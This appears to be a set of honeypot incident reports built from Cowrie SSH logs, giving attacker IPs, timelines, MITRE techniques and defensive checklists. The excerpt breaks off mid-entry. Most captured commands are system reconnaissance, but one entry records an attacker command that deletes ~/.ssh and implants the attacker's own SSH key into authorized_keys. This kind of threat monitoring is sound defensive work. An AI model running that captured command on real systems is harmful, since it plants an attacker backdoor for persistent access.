### 🔴 HIGH · IR-17f10f91fb62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:17 |
| **Last Seen** | 2026-07-24 08:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:17:15` | `cowrie.session.connect` |
| `2026-07-24 08:17:15` | `cowrie.client.version` |
| `2026-07-24 08:17:15` | `cowrie.client.kex` |
| `2026-07-24 08:17:17` | `cowrie.login.success` |
| `2026-07-24 08:17:19` | `cowrie.session.params` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.success` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.command.input` |
| `2026-07-24 08:17:19` | `cowrie.log.closed` |
| `2026-07-24 08:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c9b2eab127

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:17 |
| **Last Seen** | 2026-07-24 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:17:26` | `cowrie.session.connect` |
| `2026-07-24 08:17:26` | `cowrie.client.version` |
| `2026-07-24 08:17:26` | `cowrie.client.kex` |
| `2026-07-24 08:17:26` | `cowrie.login.success` |
| `2026-07-24 08:17:27` | `cowrie.session.params` |
| `2026-07-24 08:17:27` | `cowrie.command.input` |
| `2026-07-24 08:17:27` | `cowrie.log.closed` |
| `2026-07-24 08:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1018ae440ca

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:19 |
| **Last Seen** | 2026-07-24 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:19:15` | `cowrie.session.connect` |
| `2026-07-24 08:19:15` | `cowrie.client.version` |
| `2026-07-24 08:19:15` | `cowrie.client.kex` |
| `2026-07-24 08:19:15` | `cowrie.login.success` |
| `2026-07-24 08:19:16` | `cowrie.session.params` |
| `2026-07-24 08:19:16` | `cowrie.command.input` |
| `2026-07-24 08:19:16` | `cowrie.log.closed` |
| `2026-07-24 08:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4221c1d72e00

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:19 |
| **Last Seen** | 2026-07-24 08:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:19:19` | `cowrie.session.connect` |
| `2026-07-24 08:19:20` | `cowrie.client.version` |
| `2026-07-24 08:19:20` | `cowrie.client.kex` |
| `2026-07-24 08:19:22` | `cowrie.login.success` |
| `2026-07-24 08:19:23` | `cowrie.session.params` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.success` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.command.input` |
| `2026-07-24 08:19:23` | `cowrie.log.closed` |
| `2026-07-24 08:19:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91af5ce8ffa0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:21 |
| **Last Seen** | 2026-07-24 08:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:21:05` | `cowrie.session.connect` |
| `2026-07-24 08:21:05` | `cowrie.client.version` |
| `2026-07-24 08:21:06` | `cowrie.client.kex` |
| `2026-07-24 08:21:06` | `cowrie.login.success` |
| `2026-07-24 08:21:07` | `cowrie.session.params` |
| `2026-07-24 08:21:07` | `cowrie.command.input` |
| `2026-07-24 08:21:07` | `cowrie.log.closed` |
| `2026-07-24 08:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044f76c893d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:21 |
| **Last Seen** | 2026-07-24 08:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:21:24` | `cowrie.session.connect` |
| `2026-07-24 08:21:24` | `cowrie.client.version` |
| `2026-07-24 08:21:24` | `cowrie.client.kex` |
| `2026-07-24 08:21:26` | `cowrie.login.success` |
| `2026-07-24 08:21:27` | `cowrie.session.params` |
| `2026-07-24 08:21:27` | `cowrie.command.input` |
| `2026-07-24 08:21:27` | `cowrie.command.input` |
| `2026-07-24 08:21:27` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.success` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.command.input` |
| `2026-07-24 08:21:28` | `cowrie.log.closed` |
| `2026-07-24 08:21:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035845cabe34

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:22 |
| **Last Seen** | 2026-07-24 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:22:59` | `cowrie.session.connect` |
| `2026-07-24 08:22:59` | `cowrie.client.version` |
| `2026-07-24 08:22:59` | `cowrie.client.kex` |
| `2026-07-24 08:22:59` | `cowrie.login.success` |
| `2026-07-24 08:23:00` | `cowrie.session.params` |
| `2026-07-24 08:23:00` | `cowrie.command.input` |
| `2026-07-24 08:23:00` | `cowrie.log.closed` |
| `2026-07-24 08:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d7ecfad2bd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:23 |
| **Last Seen** | 2026-07-24 08:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:23:31` | `cowrie.session.connect` |
| `2026-07-24 08:23:31` | `cowrie.client.version` |
| `2026-07-24 08:23:31` | `cowrie.client.kex` |
| `2026-07-24 08:23:33` | `cowrie.login.success` |
| `2026-07-24 08:23:35` | `cowrie.session.params` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.success` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.command.input` |
| `2026-07-24 08:23:35` | `cowrie.log.closed` |
| `2026-07-24 08:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6bd3816d47

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-07-24 08:24 |
| **Last Seen** | 2026-07-24 08:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:24:31` | `cowrie.session.connect` |
| `2026-07-24 08:24:31` | `cowrie.client.version` |
| `2026-07-24 08:24:31` | `cowrie.client.kex` |
| `2026-07-24 08:24:33` | `cowrie.login.success` |
| `2026-07-24 08:24:34` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ffa3298dd5

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-07-24 08:24 |
| **Last Seen** | 2026-07-24 08:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:24:43` | `cowrie.session.connect` |
| `2026-07-24 08:24:44` | `cowrie.client.version` |
| `2026-07-24 08:24:44` | `cowrie.client.kex` |
| `2026-07-24 08:24:46` | `cowrie.login.success` |
| `2026-07-24 08:24:47` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a41d0f2b43

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:24 |
| **Last Seen** | 2026-07-24 08:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:24:50` | `cowrie.session.connect` |
| `2026-07-24 08:24:50` | `cowrie.client.version` |
| `2026-07-24 08:24:50` | `cowrie.client.kex` |
| `2026-07-24 08:24:50` | `cowrie.login.success` |
| `2026-07-24 08:24:51` | `cowrie.session.params` |
| `2026-07-24 08:24:51` | `cowrie.command.input` |
| `2026-07-24 08:24:51` | `cowrie.log.closed` |
| `2026-07-24 08:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9482dc3c036a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:25 |
| **Last Seen** | 2026-07-24 08:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:25:32` | `cowrie.session.connect` |
| `2026-07-24 08:25:32` | `cowrie.client.version` |
| `2026-07-24 08:25:32` | `cowrie.client.kex` |
| `2026-07-24 08:25:34` | `cowrie.login.success` |
| `2026-07-24 08:25:36` | `cowrie.session.params` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.success` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.command.input` |
| `2026-07-24 08:25:36` | `cowrie.log.closed` |
| `2026-07-24 08:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d37eb0d9bb8

| Field | Detail |
|---|---|
| **Source IP** | `198.23.177[.]233` |
| **First Seen** | 2026-07-24 08:26 |
| **Last Seen** | 2026-07-24 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:26:04` | `cowrie.session.connect` |
| `2026-07-24 08:26:04` | `cowrie.client.version` |
| `2026-07-24 08:26:04` | `cowrie.client.kex` |
| `2026-07-24 08:26:04` | `cowrie.login.success` |
| `2026-07-24 08:26:05` | `cowrie.session.params` |
| `2026-07-24 08:26:05` | `cowrie.command.input` |
| `2026-07-24 08:26:05` | `cowrie.command.failed` |
| `2026-07-24 08:26:05` | `cowrie.log.closed` |
| `2026-07-24 08:26:06` | `cowrie.session.params` |
| `2026-07-24 08:26:06` | `cowrie.command.input` |
| `2026-07-24 08:26:06` | `cowrie.session.file_download` |
| `2026-07-24 08:26:06` | `cowrie.log.closed` |
| `2026-07-24 08:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.177[.]233` to AbuseIPDB if not already reported
- [ ] Block `198.23.177[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6988ba94d3

| Field | Detail |
|---|---|
| **Source IP** | `198.23.177[.]233` |
| **First Seen** | 2026-07-24 08:26 |
| **Last Seen** | 2026-07-24 08:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:26:06` | `cowrie.session.connect` |
| `2026-07-24 08:26:06` | `cowrie.client.version` |
| `2026-07-24 08:26:06` | `cowrie.client.kex` |
| `2026-07-24 08:26:06` | `cowrie.login.success` |
| `2026-07-24 08:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.177[.]233` to AbuseIPDB if not already reported
- [ ] Block `198.23.177[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43da1b517fcf

| Field | Detail |
|---|---|
| **Source IP** | `198.23.177[.]233` |
| **First Seen** | 2026-07-24 08:26 |
| **Last Seen** | 2026-07-24 08:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:26:06` | `cowrie.session.connect` |
| `2026-07-24 08:26:06` | `cowrie.client.version` |
| `2026-07-24 08:26:06` | `cowrie.client.kex` |
| `2026-07-24 08:26:06` | `cowrie.login.success` |
| `2026-07-24 08:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.177[.]233` to AbuseIPDB if not already reported
- [ ] Block `198.23.177[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d986a096ca

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:26 |
| **Last Seen** | 2026-07-24 08:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:26:39` | `cowrie.session.connect` |
| `2026-07-24 08:26:39` | `cowrie.client.version` |
| `2026-07-24 08:26:39` | `cowrie.client.kex` |
| `2026-07-24 08:26:39` | `cowrie.login.success` |
| `2026-07-24 08:26:40` | `cowrie.session.params` |
| `2026-07-24 08:26:40` | `cowrie.command.input` |
| `2026-07-24 08:26:40` | `cowrie.log.closed` |
| `2026-07-24 08:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac843ae8aef7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:27 |
| **Last Seen** | 2026-07-24 08:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:27:29` | `cowrie.session.connect` |
| `2026-07-24 08:27:30` | `cowrie.client.version` |
| `2026-07-24 08:27:30` | `cowrie.client.kex` |
| `2026-07-24 08:27:32` | `cowrie.login.success` |
| `2026-07-24 08:27:33` | `cowrie.session.params` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.success` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:33` | `cowrie.command.input` |
| `2026-07-24 08:27:34` | `cowrie.log.closed` |
| `2026-07-24 08:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d86035caf6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:28 |
| **Last Seen** | 2026-07-24 08:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:28:37` | `cowrie.session.connect` |
| `2026-07-24 08:28:37` | `cowrie.client.version` |
| `2026-07-24 08:28:37` | `cowrie.client.kex` |
| `2026-07-24 08:28:37` | `cowrie.login.success` |
| `2026-07-24 08:28:38` | `cowrie.session.params` |
| `2026-07-24 08:28:38` | `cowrie.command.input` |
| `2026-07-24 08:28:38` | `cowrie.log.closed` |
| `2026-07-24 08:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc4d2294ff8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
